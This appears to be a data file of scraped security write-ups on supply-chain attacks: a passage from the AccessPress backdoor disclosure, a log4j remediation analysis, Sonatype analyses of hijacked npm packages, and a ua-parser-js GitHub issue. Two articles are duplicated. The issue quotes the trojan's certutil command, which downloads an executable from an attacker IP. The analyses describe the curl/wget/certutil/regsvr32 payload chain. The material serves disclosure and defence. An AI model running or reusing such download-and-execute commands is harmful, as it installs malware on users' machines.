Also the distribution of timestamps within the archive is less uniform and reflects which files were updated in the release, and which are unchanged from an older release.This suggests to us that the files from the AccessPress Themes website were modified intentionally, and as a coordinated action after they were originally released. The compromise seems to have been performed in two stages, one for the plugins and a later one for the themes. Each of them with some earlier attempts, possibly to fine tune the process.Our investigation has only looked at the themes and plugins freely available from the AccessPress Themes website. We assume their paid pro themes are affected similarly, but we have not examined these. If you have any of these, please contact AccessPress Themes support for further advice.Affected themesIf you have any of the following themes with a version number in the Bad column installed on your site, we do recommend to upgrade to the version in the Clean column immediately. Its worth noting that the themes installed through WordPress.org are clean, even if they are listed in the Bad column. We still recommend upgrading to the known clean version to be on the safe side.Themes with no version number in the Clean column have not yet been upgraded, and we recommend replacing it with another theme if at all possible.Theme slug Bad Clean accessbuddy 1.0.0 accesspress-basic 3.2.1 3.2.2 accesspress-lite 2.92 2.93 accesspress-mag 2.6.5 2.6.6 accesspress-parallax 4.5 4.6 accesspress-ray 1.19.5 accesspress-root 2.5 2.6.0 accesspress-staple 1.9.1 accesspress-store 2.4.9 2.5.0 agency-lite 1.1.6 1.1.7 aplite 1.0.6 bingle 1.0.4 1.0.5 bloger 1.2.6 1.2.7 construction-lite 1.2.5 1.2.6 doko 1.0.27 1.1.0 enlighten 1.3.5 1.3.6 fashstore 1.2.1 fotography 2.4.0 2.4.1 gaga-corp 1.0.8 gaga-lite 1.4.2 one-paze 2.2.8 parallax-blog 3.1.1574941215 parallaxsome 1.3.6 1.3.7 punte 1.1.2 1.1.3 revolve 1.3.1 ripple 1.2.0 1.2.1 scrollme 2.1.0 sportsmag 1.2.1 storevilla 1.4.1 1.4.2 swing-lite 1.1.9 1.2.0 the-launcher 1.3.2 1.3.3 the-monday 1.4.1 uncode-lite 1.3.1 unicon-lite 1.2.6 1.2.7 vmag 1.2.7 1.2.8 vmagazine-lite 1.3.5 1.3.7 vmagazine-news 1.0.5 1.0.6 zigcy-baby 1.0.6 1.0.7 zigcy-cosmetics 1.0.5 1.0.6 zigcy-lite 2.0.9 2.1.0 Table 1: Themes and versions compromised by the attack.Affected pluginsIf you have any of the following plugins with a version number in the Bad column installed on your site, we do recommend to upgrade to the version in the Clean column immediately. Its worth noting that the plugins installed through WordPress.org are clean, even if they are listed in the Bad column. We still recommend upgrading to the known clean version to be on the safe side.Plugins with no version number in the Clean column have not yet been upgraded, and we recommend replacing it with other plugins if at all possible.Plugin slug Bad Clean Note accesspress-anonymous-post 2.8.0 2.8.1 1 accesspress-custom-css 2.0.1 2.0.2 accesspress-custom-post-type 1.0.8 1.0.9 accesspress-facebook-auto-post 2.1.3 2.1.4 accesspress-instagram-feed 4.0.3 4.0.4 accesspress-pinterest 3.3.3 3.3.4 accesspress-social-counter 1.9.1 1.9.2 accesspress-social-icons 1.8.2 1.8.3 accesspress-social-login-lite 3.4.7 3.4.8 accesspress-social-share 4.5.5 4.5.6 accesspress-twitter-auto-post 1.4.5 1.4.6 accesspress-twitter-feed 1.6.7 1.6.8 ak-menu-icons-lite 1.0.9 ap-companion 1.0.7 2 ap-contact-form 1.0.6 1.0.7 ap-custom-testimonial 1.4.6 1.4.7 ap-mega-menu 3.0.5 3.0.6 ap-pricing-tables-lite 1.1.2 1.1.3 apex-notification-bar-lite 2.0.4 2.0.5 cf7-store-to-db-lite 1.0.9 1.1.0 comments-disable-accesspress 1.0.7 1.0.8 easy-side-tab-cta 1.0.7 1.0.8 everest-admin-theme-lite 1.0.7 1.0.8 everest-coming-soon-lite 1.1.0 1.1.1 everest-comment-rating-lite 2.0.4 2.0.5 everest-counter-lite 2.0.7 2.0.8 everest-faq-manager-lite 1.0.8 1.0.9 everest-gallery-lite 1.0.8 1.0.9 everest-google-places-reviews-lite 1.0.9 2.0.0 everest-review-lite 1.0.7 everest-tab-lite 2.0.3 2.0.4 everest-timeline-lite 1.1.1 1.1.2 inline-call-to-action-builder-lite 1.1.0 1.1.1 product-slider-for-woocommerce-lite 1.1.5 1.1.6 smart-logo-showcase-lite 1.1.7 1.1.8 smart-scroll-posts 2.0.8 2.0.9 smart-scroll-to-top-lite 1.0.3 1.0.4 total-gdpr-compliance-lite 1.0.4 1.0.5 total-team-lite 1.1.1 1.1.2 ultimate-author-box-lite 1.1.2 1.1.3 ultimate-form-builder-lite 1.5.0 1.5.1 woo-badge-designer-lite 1.1.0 1.1.1 wp-1-slider 1.2.9 1.3.0 wp-blog-manager-lite 1.1.0 1.1.2 wp-comment-designer-lite 2.0.3 2.0.4 wp-cookie-user-info 1.0.7 1.0.8 wp-facebook-review-showcase-lite 1.0.9 wp-fb-messenger-button-lite 2.0.7 wp-floating-menu 1.4.4 1.4.5 wp-media-manager-lite 1.1.2 1.1.3 wp-popup-banners 1.2.3 1.2.4 wp-popup-lite 1.0.8 wp-product-gallery-lite 1.1.1 1.1.3 Table 2: Plugins, versions compromised by the attack as well as known clean versions,Notes:This plugin has not been updated, but is believed to be clean as the version on the AccessPress Themes website was an older version. This plugin has not been updated, but is believed to be clean as it was not originally available on the AccessPress Themes website.IOCsThe following YARA rule can be used to check if the site has been infected. It will detect both the dropper part of the infection as well as the installed webshell.RecommendationsIf you have any themes or plugins installed directly from AccessPress Themes or any other place except WordPress.org, you should upgrade immediately to a safe version as indicated in the tables above. If no safe version is available, replace it with the latest version from WordPress.org.Please note that this does not remove the backdoor from your system, so in addition you need to reinstall a clean version of WordPress to revert the core file modifications done during installation of the back door.If you have a paid theme or plugin from AccessPress Themes/Access Keys, we advise contacting their support for help.We strongly recommend that you have a security plan for your site that includes malicious file scanning and backups. Jetpack Security is one great WordPress security option to ensure your site and visitors are safe. Jetpack Scan has detected all variants of this back door and the dropper since September 30.Timeline2021-09-22: Jetpack Scan team discovers the dropper and back door in the FotoGraphy theme, and tries to contact vendor about the initial finding.2021-09-27: Confirm presence of dropper + back door in all current free plugins and themes downloaded from vendors website.2021-09-28: Confirm that dropper + back door is not present on downloads from wordpress.org2021-09-29: Trying to contact vendor again, with updates on new findings.2021-10-14: Escalated to WordPress plugins team to try to obtain contact with the vendor.2021-10-15: Compromised extensions are removed from the vendors site.2021-10-16: Response from vendor2022-01-17: Most plugins have been upgraded to new versions, themes have been pulled from WordPress.org.2022-01-18 Public disclosureHarald Eilertsen Harald is a Certified Systems Security Professional (CISSP) with a wide background from software development and the security industry. He has a Master of Science in analog microelectronics from the Norwegian University of Science and Technology (NTNU), and has worked for companies such as Norman, Tandberg and Cisco before joining the Jetpack Scan team at Automattic.Explore the benefits of Jetpack Learn how Jetpack can help you protect, speed up, and grow your WordPress site. Get up to 50% off your first year. Compare plans"
article12 = "Published on None. What is the current progress in fixing the open source JVM ecosystem?We counted an artifact as fixed if the artifact had at least one version affected and has released a greater stable version (according to semantic versioning) that is unaffected. An artifact affected by log4j is considered fixed if it has updated to 2.16.0 or removed its dependency on log4j altogether.At the time of writing, nearly five thousand of the affected artifacts have been fixed. This represents a rapid response and mammoth effort both by the log4j maintainers and the wider community of open source consumers.That leaves over 30,000 artifacts affected, many of which are dependent on another artifact to patch (the transitive dependency) and are likely blocked.Why is fixing the JVM ecosystem hard?Most artifacts that depend on log4j do so indirectly. The deeper the vulnerability is in a dependency chain, the more steps are required for it to be fixed. The following diagram shows a histogram of how deeply an affected log4j package (core or api) first appears in consumers dependency graphs. For greater than 80% of the packages, the vulnerability is more than one level deep, with a majority affected five levels down (and some as many as nine levels down). These packages will require fixes throughout all parts of the tree, starting from the deepest dependencies first.In the Java ecosystem, its common practice to specify This practice is in contrast to other ecosystems, such as npm, where its common for developers to specify open ranges for dependency requirements. Open ranges allow the resolution algorithm to select the most recently released version that satisfies dependency requirements, thereby pulling in new fixes. Consumers can get a patched version on the next build after the patch is available, which propagates up the dependencies quickly. (This approach is not without its drawbacks; pulling in new fixes can also pull in new problems.) Another difficulty is caused by ecosystem-level choices in the dependency resolution algorithm and requirement specification conventions.In the Java ecosystem, its common practice to specify  soft  version requirements — exact versions that are used by the resolution algorithm if no other version of the same package appears earlier in the dependency graph. Propagating a fix often requires explicit action by the maintainers to update the dependency requirements to a patched version.This practice is in contrast to other ecosystems, such as npm, where its common for developers to specify open ranges for dependency requirements. Open ranges allow the resolution algorithm to select the most recently released version that satisfies dependency requirements, thereby pulling in new fixes. Consumers can get a patched version on the next build after the patch is available, which propagates up the dependencies quickly. (This approach is not without its drawbacks; pulling in new fixes can also pull in new problems.)How long will it take for this vulnerability to be fixed across the entire ecosystem?"
article13 = "Published on None. Just last week we saw the popular npm package `ua-parser-js` get hijacked. Malicious actors gained access to the project maintainers npm account and published malicious versions that attempted to install a cryptominer on the compromised system and download a malicious DLL in charge of stealing credentials.Well, it happened again. This time the `coa` and `rc` packages were hijacked, via an npm account takeover. The hijacked versions of these packages are tracked under sonatype-2021-1696.Coa is a command line option parser with over 9 Million weekly downloads which hasnt been legitimately updated in 3 years. `Rc` is used to easily load configuration options with an astounding 14 million weekly downloads and just like Coa, it hasnt seen a new release in 3 years. Coincidence? Or, clue as to how attackers are choosing their targets?Much like `ua-parser-js`, these packages are also used by tech industry giants, such as Microsoft and Meta (Facebook), according to grep.app results:It all happened pretty quickly, but as soon as Sonatype became aware of the malicious versions of `coa` and `rc` appearing on npm, we expedited Deep Dive research on them.Whats Inside the Malicious `coa` and `rc` Versions?The malicious versions leverage built-in certutil binaries, also known as LOLBins, to download a password stealing trojan, possibly Danabot once again. No crypto miner this time, but the same techniques are present, which indicate it is likely the same threat actors.A lot of users quickly noticed this and began commenting on the projects GitHub Issues page. This was actually really helpful, the user that created the issue even shared the diff of the malicious version vs. the older legitimate one. This gave us an idea where to start looking.A new preinstall script had been included in the package.json file that executed the compile.js script. Something interesting is that not all malicious versions actually had the compile.js and compile.bat files, perhaps they were tests, only version 2.0.4 and 2.1.1 were fully equipped with the payload.Once we took a look at the JavaScript file we noticed it was obfuscated, not as heavily as some real head-scratchers weve seen, but still not really readable. After some deobfuscation we had something we could make sense of.All this was trying to hide from us is that it wants to run a Batch script, can it be that bad?So now a new player now comes into play, compile.bat. This file implemented the variable expansion technique to attempt to hide its real intentions. All variable expansion really is, is a form of substitution cipher.In the image above we see the variable `aim` defined as a sequence of seemingly random characters. Then we see a whole lot of variable expansion that looks like, %aim:~x,y%, where its simply referencing our previously defined `aim` variable. X is the offset and y is the amount of characters to take. Notice that y is always 1. That way %aim:~4,1% really means aim[4] which is `e`. And at the end of it all, we have something like the following.The attackers werent taking any chances. They first attempt to download the payload with curl, in case that doesnt work they try with wget and then if that doesnt work either they go with the LOLBin certutil to do the trick. Finally, using the friend of all red teamers and likely some malicious actors, regsvr32.exe executes the DLL payload.The DLL [VirusTotal] is a password-stealing trojan, likely Danabot, that was also seen in previous attacks. This trojan attempts to steal passwords from all flavors of web browsers, various applications including VNC and FTP clients, look for credit card numbers and even log keystrokes to report back to the attackers.As quickly as all this took place, so did the fix; the malicious versions were removed from npm almost as soon as they were uploaded.Following ongoing investigations, we identified in real time multiple versions of the rc package containing identical malware to the coa package. malicious versions of rc were immediately removed from the registry and we have published an advisory, tweeted npm yesterday.Npm also suggests that open source project maintainers enable two-factor authentication to better protect their accounts.All this raises two crucial questions:How are the attackers choosing their targets? So far all hijacked components have been very popular with millions of weekly downloads.And, more importantly, how do they keep compromising npm accounts? Easy to guess passwords? Or, a result of credential stuffing attacks?Evolving open source supply-chain attacks warrant advanced protectionWeve been saying for the past two years that developers are the new target for adversaries. This discovery, when added to the thousands of similar attacks Sonatype has been tracking, shows this attack vector is no longer novel, but has become the norm. Weve come to a point where organizations can no longer ignore this reality. From Brandjacking, typosquatting, and cryptomining malware lurking in software repositories to critical vulnerabilities and next-gen supply-chain attacks, as well as copycat packages targeting well-known tech companies, advanced protection must be a part of everyones 2022 planThe good news is, over the past few weeks, Sonatypes automated malware detection system has caught thousands of suspicious packages on npm. These components are either confirmed malicious, previously known to be malicious, or dependency confusion copycats.We are now expanding our malware detection capabilities via Nexus Intelligence to other ecosystems as well, such as PyPI.All of this takes more than just due diligence and luck – it takes the expertise of experienced security professionals and hundreds of terabytes of data. In order to keep pace with malware mutations, Sonatype analyses every newly-released npm package to keep developers safe.We help you remain proactive and safeguard your software supply chains against up-and-coming attacks. Our AI/ML-powered automated malware detection system (which is part of Nexus Firewall and powered by Nexus Intelligence data), and security research team work together for full-spectrum protection. Nexus determines a likely malicious component based on historical supply chain attacks and over five-dozen signals. This insight enables flagging for potential new attacks before security researchers discover them.As soon as our system flags a package or a dependency as suspicious, it undergoes a quarantine queue for manual review by the Sonatype Security Research Team. Users of Nexus Firewall are then protected from these suspicious packages while the review is underway. Existing components are quarantined before they are pulled downstream into a developers open source build environment.Moreover, users that have enabled the Dependency Confusion Policy feature will get proactive protection from dependency confusion attacks. This works whether conflicting package names exist in a public repository or in your private, internal repos.Sonatypes world-class security research data, combined with our automated malware detection technology safeguards your developers, customers, and software supply chain from infections."
article14 = """Security issue: compromised npm packages of ua-parser-js (0.7.29, 0.8.0, 1.0.0) - Questions about deprecated npm package ua-parser-js #536
Open
SuperOleg39 opened this issue on Oct 22, 2021 · 187 comments
Open
Security issue: compromised npm packages of ua-parser-js (0.7.29, 0.8.0, 1.0.0) - Questions about deprecated npm package ua-parser-js
#536
SuperOleg39 opened this issue on Oct 22, 2021 · 187 comments
Comments
@SuperOleg39
SuperOleg39 commented on Oct 22, 2021
Hi!
See a warning at npm - https://www.npmjs.com/package/ua-parser-js - This package has been hijacked. Please revert to 0.7.28
First question - Can we use range ^0.7.28, or it is not safe?
Second question - Will you create a new package, or try to remove hijacked versions and continue update this package?
nypinstripes, meskill, colmose, XoBpawok, LyesIsogeo, aimozg, alex-drocks, myshov, TchernyavskyDaniil, azinit, and 103 more reacted with thumbs up emoji
Bronx205, bryanseah234, patrickxchong, JoseCage, akucharczyk, kljoel, and pipebits reacted with hooray emoji
zloirock, brainkim, JaneJeon, JimmyMultani, sergei-startsev, Tiberriver256, jabali2004, clemak27, Wetbikeboy2500, yvele, and 60 more reacted with eyes emoji
@nypinstripes
nypinstripes commented on Oct 22, 2021
Ouch does that mean like there's malicious code in it or something?
@faisalman
alex-drocks, PeredurOmega, sunderee, superswan, damjan25, iam-py-test, and babyrusa reacted with thumbs up emoji
@LyesIsogeo
LyesIsogeo commented on Oct 22, 2021 • 
I just update package and windows defender block "ceprolad.a" a trojan. I don't have any internet access at the same moment...
The trojan try to execute in the cmd: "certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe". The certutil -rulcacha -f download a .exe file.
alex-drocks, azinit, PeredurOmega, metasean, lewis-hu, ReznicencuBogdan, BiosElement, vitali2y, Kovinda, danieltroger, and 13 more reacted with thumbs up emoji
@SuperOleg39
Author
SuperOleg39 commented on Oct 22, 2021 • 
Update - ^0.7.28 range is dangerous, 0.7.29 version already published.
We all need to fix 0.7.28 in our dependencies.
alex-drocks, ynbh, PeredurOmega, metasean, jfoclpf, micalevisk, natasria, AndreiCalazans, YeemBoi, vukkumsp, and 3 more reacted with thumbs up emoji
@SuperOleg39
Author
SuperOleg39 commented on Oct 22, 2021
@faisalman i hope you can revert versions with vulnerabilities?
@KalleOlaviNiemitalo
KalleOlaviNiemitalo commented on Oct 22, 2021
0.7.29 includes scripts that download and execute binaries. From the command-line arguments, one of them looks like a cryptominer, but that might be just for camouflage.
metasean, jfoclpf, pizzaminded, natasria, haloboy777, YeemBoi, cronlabspl, tig-mmp, vukkumsp, vfortin01, and 3 more reacted with thumbs up emoji
@SuperOleg39 SuperOleg39 mentioned this issue on Oct 22, 2021
chore: fixed version ua-parser-js - package has been hijacked wessberg/browserslist-generator#6
 Closed
@ohanedan ohanedan mentioned this issue on Oct 22, 2021
node_module dependency "ua-parser-js" is hijacked by malware karma-runner/karma#3712
 Closed
@alex-drocks
alex-drocks commented on Oct 22, 2021 • 
Revert back to 0.7.28 all greater version are infected. My computer was infected this morning when i updated my docusaurus version.
https://twitter.com/DrocksAlex/status/1451543176779534342
NPM official flag: https://www.npmjs.com/package/ua-parser-js
vukkumsp reacted with thumbs up emoji
metasean, AndreiCalazans, krol3, fatso83, and runderworld reacted with confused emoji
@alex-drocks alex-drocks mentioned this issue on Oct 22, 2021
SECURITY-ISSUE: node_module dependency "ua-parser-js" is hijacked by malware facebook/docusaurus#5769
Closed
5 tasks
@Tom910
Tom910 commented on Oct 22, 2021
The best solution is to publish the 0.7.30 version without the vulnerability. Then ^ will jump to the vulnerable version
SuperOleg39, JaneJeon, metasean, jdupont, Manu-Chatterjee-MDT, nickvdwaal, cyc115, Shaptic, magne4000, rsml, and 17 more reacted with thumbs up emoji
@faisalman
Owner
faisalman commented on Oct 22, 2021
Hi all, very sorry about this.
I noticed something unusual when my email was suddenly flooded by spams from hundreds of websites (maybe so I don't realize something was up, luckily the effect is quite the contrary).
I believe someone was hijacking my npm account and published some compromised packages (0.7.29, 0.8.0, 1.0.0) which will probably install malware as can be seen from the diff here: https://app.renovatebot.com/package-diff?name=ua-parser-js&from=0.7.28&to=1.0.0
I have sent a message to NPM support since I can't seem to unpublish the compromised versions (maybe due to npm policy https://docs.npmjs.com/policies/unpublish) so I can only deprecate them with a warning message."""
article13 = "Published on None. Just last week we saw the popular npm package `ua-parser-js` get hijacked. Malicious actors gained access to the project maintainers npm account and published malicious versions that attempted to install a cryptominer on the compromised system and download a malicious DLL in charge of stealing credentials.Well, it happened again. This time the `coa` and `rc` packages were hijacked, via an npm account takeover. The hijacked versions of these packages are tracked under sonatype-2021-1696.Coa is a command line option parser with over 9 Million weekly downloads which hasnt been legitimately updated in 3 years. `Rc` is used to easily load configuration options with an astounding 14 million weekly downloads and just like Coa, it hasnt seen a new release in 3 years. Coincidence? Or, clue as to how attackers are choosing their targets?Much like `ua-parser-js`, these packages are also used by tech industry giants, such as Microsoft and Meta (Facebook), according to grep.app results:It all happened pretty quickly, but as soon as Sonatype became aware of the malicious versions of `coa` and `rc` appearing on npm, we expedited Deep Dive research on them.Whats Inside the Malicious `coa` and `rc` Versions?The malicious versions leverage built-in certutil binaries, also known as LOLBins, to download a password stealing trojan, possibly Danabot once again. No crypto miner this time, but the same techniques are present, which indicate it is likely the same threat actors.A lot of users quickly noticed this and began commenting on the projects GitHub Issues page. This was actually really helpful, the user that created the issue even shared the diff of the malicious version vs. the older legitimate one. This gave us an idea where to start looking.A new preinstall script had been included in the package.json file that executed the compile.js script. Something interesting is that not all malicious versions actually had the compile.js and compile.bat files, perhaps they were tests, only version 2.0.4 and 2.1.1 were fully equipped with the payload.Once we took a look at the JavaScript file we noticed it was obfuscated, not as heavily as some real head-scratchers weve seen, but still not really readable. After some deobfuscation we had something we could make sense of.All this was trying to hide from us is that it wants to run a Batch script, can it be that bad?So now a new player now comes into play, compile.bat. This file implemented the variable expansion technique to attempt to hide its real intentions. All variable expansion really is, is a form of substitution cipher.In the image above we see the variable `aim` defined as a sequence of seemingly random characters. Then we see a whole lot of variable expansion that looks like, %aim:~x,y%, where its simply referencing our previously defined `aim` variable. X is the offset and y is the amount of characters to take. Notice that y is always 1. That way %aim:~4,1% really means aim[4] which is `e`. And at the end of it all, we have something like the following.The attackers werent taking any chances. They first attempt to download the payload with curl, in case that doesnt work they try with wget and then if that doesnt work either they go with the LOLBin certutil to do the trick. Finally, using the friend of all red teamers and likely some malicious actors, regsvr32.exe executes the DLL payload.The DLL [VirusTotal] is a password-stealing trojan, likely Danabot, that was also seen in previous attacks. This trojan attempts to steal passwords from all flavors of web browsers, various applications including VNC and FTP clients, look for credit card numbers and even log keystrokes to report back to the attackers.As quickly as all this took place, so did the fix; the malicious versions were removed from npm almost as soon as they were uploaded.Following ongoing investigations, we identified in real time multiple versions of the rc package containing identical malware to the coa package. malicious versions of rc were immediately removed from the registry and we have published an advisory, tweeted npm yesterday.Npm also suggests that open source project maintainers enable two-factor authentication to better protect their accounts.All this raises two crucial questions:How are the attackers choosing their targets? So far all hijacked components have been very popular with millions of weekly downloads.And, more importantly, how do they keep compromising npm accounts? Easy to guess passwords? Or, a result of credential stuffing attacks?Evolving open source supply-chain attacks warrant advanced protectionWeve been saying for the past two years that developers are the new target for adversaries. This discovery, when added to the thousands of similar attacks Sonatype has been tracking, shows this attack vector is no longer novel, but has become the norm. Weve come to a point where organizations can no longer ignore this reality. From Brandjacking, typosquatting, and cryptomining malware lurking in software repositories to critical vulnerabilities and next-gen supply-chain attacks, as well as copycat packages targeting well-known tech companies, advanced protection must be a part of everyones 2022 planThe good news is, over the past few weeks, Sonatypes automated malware detection system has caught thousands of suspicious packages on npm. These components are either confirmed malicious, previously known to be malicious, or dependency confusion copycats.We are now expanding our malware detection capabilities via Nexus Intelligence to other ecosystems as well, such as PyPI.All of this takes more than just due diligence and luck – it takes the expertise of experienced security professionals and hundreds of terabytes of data. In order to keep pace with malware mutations, Sonatype analyses every newly-released npm package to keep developers safe.We help you remain proactive and safeguard your software supply chains against up-and-coming attacks. Our AI/ML-powered automated malware detection system (which is part of Nexus Firewall and powered by Nexus Intelligence data), and security research team work together for full-spectrum protection. Nexus determines a likely malicious component based on historical supply chain attacks and over five-dozen signals. This insight enables flagging for potential new attacks before security researchers discover them.As soon as our system flags a package or a dependency as suspicious, it undergoes a quarantine queue for manual review by the Sonatype Security Research Team. Users of Nexus Firewall are then protected from these suspicious packages while the review is underway. Existing components are quarantined before they are pulled downstream into a developers open source build environment.Moreover, users that have enabled the Dependency Confusion Policy feature will get proactive protection from dependency confusion attacks. This works whether conflicting package names exist in a public repository or in your private, internal repos.Sonatypes world-class security research data, combined with our automated malware detection technology safeguards your developers, customers, and software supply chain from infections."
article14 = """Security issue: compromised npm packages of ua-parser-js (0.7.29, 0.8.0, 1.0.0) - Questions about deprecated npm package ua-parser-js #536
Open
SuperOleg39 opened this issue on Oct 22, 2021 · 187 comments
Open
Security issue: compromised npm packages of ua-parser-js (0.7.29, 0.8.0, 1.0.0) - Questions about deprecated npm package ua-parser-js
#536
SuperOleg39 opened this issue on Oct 22, 2021 · 187 comments
Comments
@SuperOleg39
SuperOleg39 commented on Oct 22, 2021
Hi!
See a warning at npm - https://www.npmjs.com/package/ua-parser-js - This package has been hijacked. Please revert to 0.7.28
First question - Can we use range ^0.7.28, or it is not safe?
Second question - Will you create a new package, or try to remove hijacked versions and continue update this package?
nypinstripes, meskill, colmose, XoBpawok, LyesIsogeo, aimozg, alex-drocks, myshov, TchernyavskyDaniil, azinit, and 103 more reacted with thumbs up emoji
Bronx205, bryanseah234, patrickxchong, JoseCage, akucharczyk, kljoel, and pipebits reacted with hooray emoji
zloirock, brainkim, JaneJeon, JimmyMultani, sergei-startsev, Tiberriver256, jabali2004, clemak27, Wetbikeboy2500, yvele, and 60 more reacted with eyes emoji
@nypinstripes
nypinstripes commented on Oct 22, 2021
Ouch does that mean like there's malicious code in it or something?
@faisalman
alex-drocks, PeredurOmega, sunderee, superswan, damjan25, iam-py-test, and babyrusa reacted with thumbs up emoji
@LyesIsogeo
LyesIsogeo commented on Oct 22, 2021 • 
I just update package and windows defender block "ceprolad.a" a trojan. I don't have any internet access at the same moment...
The trojan try to execute in the cmd: "certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe". The certutil -rulcacha -f download a .exe file.
alex-drocks, azinit, PeredurOmega, metasean, lewis-hu, ReznicencuBogdan, BiosElement, vitali2y, Kovinda, danieltroger, and 13 more reacted with thumbs up emoji
@SuperOleg39
Author
SuperOleg39 commented on Oct 22, 2021 • 
Update - ^0.7.28 range is dangerous, 0.7.29 version already published.
We all need to fix 0.7.28 in our dependencies.
alex-drocks, ynbh, PeredurOmega, metasean, jfoclpf, micalevisk, natasria, AndreiCalazans, YeemBoi, vukkumsp, and 3 more reacted with thumbs up emoji
@SuperOleg39
Author
SuperOleg39 commented on Oct 22, 2021
@faisalman i hope you can revert versions with vulnerabilities?
@KalleOlaviNiemitalo
KalleOlaviNiemitalo commented on Oct 22, 2021
0.7.29 includes scripts that download and execute binaries. From the command-line arguments, one of them looks like a cryptominer, but that might be just for camouflage.
metasean, jfoclpf, pizzaminded, natasria, haloboy777, YeemBoi, cronlabspl, tig-mmp, vukkumsp, vfortin01, and 3 more reacted with thumbs up emoji
@SuperOleg39 SuperOleg39 mentioned this issue on Oct 22, 2021
chore: fixed version ua-parser-js - package has been hijacked wessberg/browserslist-generator#6
 Closed
@ohanedan ohanedan mentioned this issue on Oct 22, 2021
node_module dependency "ua-parser-js" is hijacked by malware karma-runner/karma#3712
 Closed
@alex-drocks
alex-drocks commented on Oct 22, 2021 • 
Revert back to 0.7.28 all greater version are infected. My computer was infected this morning when i updated my docusaurus version.
https://twitter.com/DrocksAlex/status/1451543176779534342
NPM official flag: https://www.npmjs.com/package/ua-parser-js
vukkumsp reacted with thumbs up emoji
metasean, AndreiCalazans, krol3, fatso83, and runderworld reacted with confused emoji
@alex-drocks alex-drocks mentioned this issue on Oct 22, 2021
SECURITY-ISSUE: node_module dependency "ua-parser-js" is hijacked by malware facebook/docusaurus#5769
Closed
5 tasks
@Tom910
Tom910 commented on Oct 22, 2021
The best solution is to publish the 0.7.30 version without the vulnerability. Then ^ will jump to the vulnerable version
SuperOleg39, JaneJeon, metasean, jdupont, Manu-Chatterjee-MDT, nickvdwaal, cyc115, Shaptic, magne4000, rsml, and 17 more reacted with thumbs up emoji
@faisalman
Owner
faisalman commented on Oct 22, 2021
Hi all, very sorry about this.
I noticed something unusual when my email was suddenly flooded by spams from hundreds of websites (maybe so I don't realize something was up, luckily the effect is quite the contrary).
I believe someone was hijacking my npm account and published some compromised packages (0.7.29, 0.8.0, 1.0.0) which will probably install malware as can be seen from the diff here: https://app.renovatebot.com/package-diff?name=ua-parser-js&from=0.7.28&to=1.0.0
I have sent a message to NPM support since I can't seem to unpublish the compromised versions (maybe due to npm policy https://docs.npmjs.com/policies/unpublish) so I can only deprecate them with a warning message."""
article15 = "Published on None. Sonatypes automated malware detection system has caught multiple malicious packages on the npm registry this month. These packages disguise themselves as legitimate JavaScript libraries but were caught launching cryptominers on Windows, macOS and Linux machines.The malicious packages are:okhsaklowklownklow, klown have been tracked under Sonatype-2021-1472. Whereas, okhsa has been cataloged under Sonatype-2021-1473.Different versions of the okhsa package largely contain skeleton code that launches the Calculator app on Windows machines pre-installation. But additionally, these versions contain either the klow or the klown npm package as a dependency—which is malicious.The manifest file, package.json, for okhsa shows klown listed as a dependency.All of these packages were published by the same author whose account has since been deactivated:The Sonatype security research team discovered that klown had emerged within hours of klow having been removed by npm. Klown falsely touts itself to be a legitimate JavaScript library UA-Parser-js to help developers extract the hardware specifics (OS, CPU, browser, engine, etc.) from the User-Agent HTTP header.But, Sonatype security researcher Ali ElShakankiry who analyzed these packages explains, Packages klow and klown contain a cryptocurrency miner. These packages detect the current operating system at the preinstall stage, and proceed to run a .bat or .sh script depending on if the user is running Windows, or a Unix-based operating system.These scripts then download an externally-hosted EXE or a Linux ELF, and execute the binary with arguments specifying the mining pool to use, the wallet to mine cryptocurrency for, and the number of CPU threads to utilize.One of the Batch scripts found in the klown package are shown below:The script downloads the jsextension.exe from a Russia-based host 185.173.36[.]219.The EXE is a known cryptominer, as previously flagged by VirusTotal. For Linux and macOS installations, an identical Bash script downloads the jsextension ELF binary from the same host.Shown below is a screenshot from a test run of the crypto mining EXE, generated via any.run. Note, the malicious EXE runs quietly in the background on an infected machine, but for the purposes of demonstration we are showing how the process would appear if it wasnt hidden:It isnt clear how the author of these packages aims to target developers. There are no obvious signs observed that indicate a case of typosquatting or dependency hijacking. Klow(n) does impersonate the legitimate UAParser.js library on the surface, making this attack seem like a weak brandjacking attempt.The Sonatype security research team reported these malicious packages to npm on October 15, 2021, hours after their release, and the packages were taken down the same day by the npm security team.Evolving open source supply-chain attacks warrant advanced protectionOnce again, this particular discovery is a further indication that developers are the new target for adversaries over the software they write. Sonatype has been tracing novel brandjacking, typosquatting, and cryptomining malware lurking in software repositories. Weve also found critical vulnerabilities and next-gen supply-chain attacks, as well as copycat packages targeting well-known tech companies.The good news is, over the past few weeks, our automated malware detection system has caught thousands of suspicious packages on npm. These components are either confirmed malicious, previously known to be malicious, or dependency confusion copycats.We are now expanding our malware detection capabilities via Nexus Intelligence to other ecosystems as well, such as PyPI.All of this takes more than just due diligence and luck – it takes the expertise of experienced security professionals and hundreds of terabytes of data. In order to keep pace with malware mutations, Sonatype analyses every newly-released npm package to keep developers safe.We help you remain proactive and safeguard your software supply chains against up-and-coming attacks. Our AI/ML-powered automated malware detection system (which is part of Nexus Firewall and powered by Nexus Intelligence data), and security research team work together for full-spectrum protection. Nexus determines a likely malicious component based on historical supply chain attacks and over five-dozen signals. This insight enables flagging for potential new attacks before security researchers discover them.As soon as our system flags a package or a dependency as suspicious, it undergoes a quarantine queue for manual review by the Sonatype Security Research Team. Users of Nexus Firewall are then protected from these suspicious packages while the review is underway. Existing components are quarantined before they are pulled downstream into a developers open source build environment.Moreover, users that have enabled the Dependency Confusion Policy feature will get proactive protection from dependency confusion attacks. This works whether conflicting package names exist in a public repository or in your private, internal repos.Sonatypes world-class security research data, combined with our automated malware detection technology safeguards your developers, customers, and software supply chain from infections.st content here…Update: Following our disclosure of these malicious packages, the legitimate library ua-parser-js used by millions was itself was found to be compromised. We have released a subsequent blog post covering the ua-parser-js compromise."
